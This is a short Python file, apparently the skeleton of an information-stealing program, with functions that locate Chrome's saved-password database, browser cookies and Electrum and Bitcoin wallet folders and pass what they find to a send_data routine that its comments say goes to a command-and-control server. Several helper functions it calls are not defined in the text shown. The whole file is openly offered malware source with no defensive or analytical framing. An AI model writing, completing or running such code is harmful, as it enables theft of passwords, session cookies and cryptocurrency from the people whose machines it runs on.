import os
import json
import requests

def steal_passwords():
    # Steal browser passwords
    chrome_path = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")
    
    # Extract passwords
    passwords = extract_chrome_passwords(chrome_path)
    
    # Send to C&C server
    send_data("passwords", passwords)

def steal_cookies():
    # Steal browser cookies
    cookies = extract_cookies()
    send_data("cookies", cookies)

def steal_wallets():
    # Steal cryptocurrency wallets
    wallet_paths = [
        "~/AppData/Roaming/Electrum/wallets/",
        "~/AppData/Roaming/Bitcoin/wallets/"
    ]
    
    for path in wallet_paths:
        if os.path.exists(path):
            wallets = extract_wallets(path)
            send_data("wallets", wallets)
